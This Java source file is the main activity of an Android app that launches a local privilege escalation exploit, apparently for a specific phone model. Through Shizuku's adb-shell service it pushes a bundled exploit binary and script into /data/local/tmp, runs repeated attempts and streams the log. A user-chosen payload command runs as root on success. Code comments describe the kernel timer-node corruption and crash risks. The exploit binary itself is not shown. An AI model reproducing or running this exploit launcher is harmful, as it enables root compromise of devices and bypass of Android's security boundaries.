package dev.ic.timerlpe;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.graphics.Typeface;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.text.InputType;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;

import rikka.shizuku.Shizuku;

/**
 * UI side.  It never touches /data/local/tmp itself: Shizuku gives us a user
 * service that runs as the adb shell (uid 2000 / u:r:shell:s0), and that
 * service relays the binary, runs run_lpe.sh and streams the log back.
 */
public class MainActivity extends Activity {
    private static final int REQ = 1001;
    private static final String TMP = "/data/local/tmp/";
    private static final int CHUNK = 128 * 1024;
    private static final String DEFAULT_CMD =
            "id; cat /proc/self/attr/current; getenforce; echo LPE-PROOF";

    private final Handler ui = new Handler(Looper.getMainLooper());

    private TextView status;
    private TextView log;
    private ScrollView scroll;
    private EditText attemptsView;
    private EditText cmdView;
    private Button connectBtn;
    private Button runBtn;

    private IIcService svc;
    private boolean bound;
    private Shizuku.UserServiceArgs args;
    private int logOff;
    private String logPath;
    private boolean polling;

    private final Shizuku.OnBinderReceivedListener onRecv =
            () -> ui.post(this::refresh);
    private final Shizuku.OnBinderDeadListener onDead =
            () -> ui.post(() -> { bound = false; svc = null; refresh(); });
    private final Shizuku.OnRequestPermissionResultListener onPerm =
            (code, res) -> ui.post(() -> {
                append("Shizuku 权限: " +
                       (res == PackageManager.PERMISSION_GRANTED
                        ? "已允许" : "被拒绝(" + res + ")"));
                if (res == PackageManager.PERMISSION_GRANTED)
                    bindService();
                refresh();
            });

    private final ServiceConnection conn = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            svc = IIcService.Stub.asInterface(binder);
            bound = true;
            new Thread(() -> {
                String id;
                try {
                    id = svc.identity();
                } catch (Throwable t) {
                    id = "读取身份失败: " + t;
                }
                final String fid = id;
                ui.post(() -> { append("[service] " + fid); refresh(); });
            }, "svc-identity").start();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            svc = null;
            bound = false;
            ui.post(MainActivity.this::refresh);
        }
    };

    private final Runnable poll = new Runnable() {
        @Override
        public void run() {
            if (!polling || svc == null || logPath == null) {
                polling = false;
                return;
            }
            try {
                int len = svc.length(logPath);
                while (logOff < len) {
                    int want = Math.min(64 * 1024, len - logOff);
                    byte[] b = svc.read(logPath, logOff, want);
                    if (b == null || b.length == 0)
                        break;
                    logOff += b.length;
                    raw(new String(b, StandardCharsets.UTF_8));
                }
            } catch (Throwable ignored) { }
            ui.postDelayed(this, 1000);
        }
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        int p = (int) (12 * getResources().getDisplayMetrics().density);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(p, p, p, p);

        TextView title = new TextView(this);
        title.setText("IC Timer LPE  (PD2506)");
        title.setTextSize(18);
        title.setTypeface(Typeface.DEFAULT_BOLD);
        root.addView(title);

        status = new TextView(this);
        status.setTextSize(12);
        status.setPadding(0, p / 2, 0, p / 2);
        root.addView(status);

        TextView warn = new TextView(this);
        warn.setTextSize(12);
        warn.setText("规则：每次完整运行前重启手机；运行后残留的 ic-timer 进程"
                + "不能 kill -9，只能重启清理。需要先启动 Shizuku（无线调试或 ADB）。");
        root.addView(warn);

        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        connectBtn = new Button(this);
        connectBtn.setText("连接 Shizuku");
        connectBtn.setOnClickListener(v -> connect());
        runBtn = new Button(this);
        runBtn.setText("推送并运行");
        runBtn.setOnClickListener(v -> run());
        Button diagBtn = new Button(this);
        diagBtn.setText("诊断");
        diagBtn.setOnClickListener(v -> diag());
        LinearLayout.LayoutParams rp = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        row.addView(connectBtn, rp);
        row.addView(runBtn, new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
        row.addView(diagBtn, new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
        root.addView(row);

        attemptsView = new EditText(this);
        attemptsView.setHint("尝试次数");
        attemptsView.setInputType(InputType.TYPE_CLASS_NUMBER);
        attemptsView.setText("10");
        root.addView(attemptsView);

        cmdView = new EditText(this);
        cmdView.setHint("PAYLOAD_CMD（成功后以 root 执行的命令）");
        cmdView.setInputType(InputType.TYPE_CLASS_TEXT
                | InputType.TYPE_TEXT_FLAG_MULTI_LINE);
        cmdView.setText(DEFAULT_CMD);
        root.addView(cmdView);

        scroll = new ScrollView(this);
        log = new TextView(this);
        log.setTextSize(10);
        log.setTypeface(Typeface.MONOSPACE);
        log.setTextIsSelectable(true);
        scroll.addView(log);
        root.addView(scroll, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f));

        setContentView(root);

        Shizuku.addBinderReceivedListenerSticky(onRecv);
        Shizuku.addBinderDeadListener(onDead);
        Shizuku.addRequestPermissionResultListener(onPerm);
        refresh();
    }

    @Override
    protected void onDestroy() {
        polling = false;
        ui.removeCallbacks(poll);
        Shizuku.removeRequestPermissionResultListener(onPerm);
        Shizuku.removeBinderDeadListener(onDead);
        Shizuku.removeBinderReceivedListener(onRecv);
        if (bound && args != null) {
            try {
                Shizuku.unbindUserService(args, conn, false);
            } catch (Throwable ignored) { }
        }
        super.onDestroy();
    }

    private void connect() {
        try {
            if (!Shizuku.pingBinder()) {
                append("Shizuku 未运行：请在 Shizuku 应用里通过无线调试或 ADB 启动服务");
                refresh();
                return;
            }
            if (Shizuku.checkSelfPermission() != PackageManager.PERMISSION_GRANTED) {
                append("已弹出 Shizuku 授权请求，请允许");
                Shizuku.requestPermission(REQ);
                return;
            }
            bindService();
        } catch (Throwable t) {
            append("连接失败: " + t);
        }
        refresh();
    }

    private void bindService() {
        try {
            ComponentName cn = new ComponentName(this, IcService.class);
            args = new Shizuku.UserServiceArgs(cn)
                    .daemon(true)
                    .debuggable(false)
                    .version(1)
                    .tag("ic-lpe")
                    .processNameSuffix(":icsvc");
            Shizuku.bindUserService(args, conn);
            append("正在绑定 shell 用户服务…");
        } catch (Throwable t) {
            append("绑定失败: " + t);
        }
    }

    private void diag() {
        final IIcService s = svc;
        if (s == null) {
            append("服务未连接：先点“连接 Shizuku”");
            return;
        }
        new Thread(() -> {
            String out;
            try {
                out = s.runCmd("id; cat /proc/self/attr/current; getenforce; "
                        + "echo ---; ls -l /data/local/tmp/ | head -20");
            } catch (Throwable t) {
                out = "诊断失败: " + t;
            }
            final String f = out;
            ui.post(() -> append("[诊断]\n" + f));
        }, "diag").start();
    }

    private void run() {
        final IIcService s = svc;
        if (s == null) {
            append("服务未连接：先点“连接 Shizuku”");
            return;
        }
        int attempts;
        try {
            attempts = Integer.parseInt(attemptsView.getText().toString().trim());
        } catch (Throwable t) {
            attempts = 10;
        }
        if (attempts < 1) attempts = 1;
        if (attempts > 64) attempts = 64;
        final int att = attempts;
        final String cmd = cmdView.getText().toString();

        // A new copy every run: truncating the ELF that parked attempts still
        // execute would SIGBUS them, and a dying attempt walks a rewritten
        // timer node (kernel oops with panic_on_oops=1).
        final String stamp = Long.toString(System.currentTimeMillis() / 1000);
        final String bin = TMP + "ic-timer-a" + stamp;
        final String script = TMP + "ic-lpe-a" + stamp + ".sh";
        final String logFile = TMP + "ic-app-a" + stamp + ".log";

        runBtn.setEnabled(false);
        new Thread(() -> {
            try {
                // The chain is only valid from the adb shell identity.  A
                // Shizuku server started as root hands out a root/ksu service,
                // and starting the exploit from there is both meaningless and
                // unsafe -- refuse instead of silently running it.
                String id0 = s.identity();
                if (!id0.startsWith("uid=2000 ") || !id0.contains("ctx=u:r:shell")) {
                    ui.post(() -> {
                        append("[run] 拒绝执行：用户服务身份不是 shell\n" + id0
                                + "\n请用 ADB / 无线调试启动 Shizuku（不要用 root 启动），"
                                + "再点“连接 Shizuku”。");
                        runBtn.setEnabled(true);
                    });
                    return;
                }
                s.truncate(script);
                push(s, "run_lpe.sh", script);
                s.makeExec(script);

                s.truncate(bin);
                push(s, "ic-timer", bin);
                s.makeExec(bin);

                s.truncate(logFile);
                String r = s.start(script, bin, logFile, att, cmd);
                ui.post(() -> {
                    append("[run] " + r);
                    logPath = logFile;
                    logOff = 0;
                    polling = true;
                    ui.postDelayed(poll, 1000);
                    runBtn.setEnabled(true);
                });
            } catch (Throwable t) {
                ui.post(() -> {
                    append("[run] 失败: " + t);
                    runBtn.setEnabled(true);
                });
            }
        }, "runner").start();
    }

    private void push(IIcService s, String asset, String dst) throws Exception {
        InputStream in = getAssets().open(asset);
        try {
            byte[] buf = new byte[CHUNK];
            int off = 0;
            int n;
            while ((n = in.read(buf)) > 0) {
                byte[] chunk = (n == buf.length) ? buf : Arrays.copyOf(buf, n);
                s.put(dst, off, chunk);
                off += n;
            }
        } finally {
            in.close();
        }
    }

    private void refresh() {
        StringBuilder sb = new StringBuilder();
        try {
            if (Shizuku.pingBinder()) {
                sb.append("Shizuku: 运行中  uid=").append(Shizuku.getUid())
                  .append("  版本=").append(Shizuku.getVersion())
                  .append("  ctx=").append(Shizuku.getSELinuxContext())
                  .append(Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
                          ? "  权限: 已授权" : "  权限: 未授权");
            } else {
                sb.append("Shizuku: 未运行（在 Shizuku 里用无线调试或 ADB 启动）");
            }
        } catch (Throwable t) {
            sb.append("Shizuku 状态读取失败: ").append(t);
        }
        sb.append("\n用户服务: ").append(bound ? "已连接" : "未连接");
        if (svc != null) {
            try {
                sb.append("  ").append(svc.identity());
            } catch (Throwable ignored) { }
        }
        status.setText(sb.toString());
    }

    private void append(String s) {
        raw(s + "\n");
    }

    private void raw(String s) {
        log.append(s);
        scroll.post(() -> scroll.fullScroll(View.FOCUS_DOWN));
    }
}
